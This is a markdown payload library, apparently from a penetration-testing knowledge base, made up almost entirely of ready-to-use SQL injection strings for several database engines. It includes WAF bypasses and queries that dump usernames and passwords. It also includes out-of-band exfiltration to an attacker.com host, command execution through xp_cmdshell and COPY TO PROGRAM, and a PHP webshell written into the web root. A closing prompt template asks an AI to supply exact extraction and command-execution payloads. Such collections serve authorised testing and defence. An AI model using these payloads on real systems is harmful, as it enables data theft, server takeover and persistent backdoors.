---
id: "sqli-payloads"
title: "SQL Injection Payload Library - All Databases"
type: "payload"
category: "web-application"
subcategory: "sqli"
tags: ["sqli", "sql-injection", "mysql", "postgresql", "mssql", "oracle", "blind", "union", "error-based", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques", "ssrf-techniques"]
updated: "2026-03-30"
---

## Overview

SQL injection payloads organized by technique (union, error-based, blind, time-based) and target database (MySQL, PostgreSQL, MSSQL, Oracle, SQLite). Always start with detection, then escalate to data extraction.

## Detection / Proof of Concept

```sql
' OR 1=1--
' OR '1'='1
" OR "1"="1
' OR 1=1#
') OR ('1'='1
' AND 1=1--
' AND 1=2--
1' ORDER BY 1--
1' ORDER BY 100--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### Numeric Context
```sql
1 OR 1=1
1 AND 1=1
1 AND 1=2
1 UNION SELECT NULL
```

### WAF Bypass Detection
```sql
' /*!OR*/ 1=1--
' %4fR 1=1--
' OR%0a1=1--
' ||1=1--
'/**/OR/**/1=1--
```

## UNION-Based Extraction

### Column Count Discovery
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY N-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### MySQL
```sql
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### PostgreSQL
```sql
' UNION SELECT 1,current_database(),3-- -
' UNION SELECT 1,string_agg(schemaname,','),3 FROM pg_tables-- -
' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -
' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'-- -
```

### MSSQL
```sql
' UNION SELECT 1,DB_NAME(),3-- -
' UNION SELECT 1,name,3 FROM master..sysdatabases-- -
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'-- -
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -
```

## Error-Based Extraction

### MySQL
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### PostgreSQL
```sql
' AND 1=CAST((SELECT current_database()) AS INTEGER)-- -
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INTEGER)-- -
```

### MSSQL
```sql
' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
```

## Blind (Boolean-Based)

### MySQL
```sql
' AND SUBSTRING(database(),1,1)='a'-- -
' AND (SELECT LENGTH(database()))=N-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96-- -
' AND (SELECT COUNT(*) FROM users)>0-- -
```

### Binary Search Template
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),§1§,1))>§64§-- -
```

## Time-Based Blind

### MySQL
```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)-- -
```

### PostgreSQL
```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
```

### MSSQL
```sql
'; WAITFOR DELAY '0:0:5'-- -
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT LEN(DB_NAME()))>0 WAITFOR DELAY '0:0:5'-- -
```

## Out-of-Band (OOB) Extraction

### MySQL (requires FILE priv)
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))-- -
```

### MSSQL (xp_dirtree)
```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'-- -
'; DECLARE @q VARCHAR(1024);SET @q='\\'+DB_NAME()+'.attacker.com\a';EXEC master..xp_dirtree @q-- -
```

### PostgreSQL (COPY)
```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup '||current_database()||'.attacker.com'-- -
```

## Command Execution

### MSSQL (xp_cmdshell)
```sql
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -
'; EXEC xp_cmdshell 'whoami'-- -
```

### PostgreSQL (COPY TO PROGRAM)
```sql
'; COPY (SELECT '') TO PROGRAM 'id'-- -
'; CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'id';SELECT * FROM cmd_exec-- -
```

### MySQL (INTO OUTFILE for webshell)
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

## Deep Dig Prompts

```
Given this injection point [describe parameter, error messages, response behavior]:
1. Determine the database type from the error message or behavior.
2. Suggest 10 detection payloads to confirm SQLi.
3. Recommend the extraction technique (UNION/error/blind/time) based on visible output.
4. Provide exact payloads to extract database name, tables, columns, and data.
5. If stacked queries work, suggest command execution payloads.
```

## Tools

- **SQLMap** — Automated SQL injection and database takeover
- **Burp Suite** — Manual SQLi testing with Intruder/Repeater
- **jSQL Injection** — GUI-based SQLi tool
- **NoSQLMap** — NoSQL injection tool
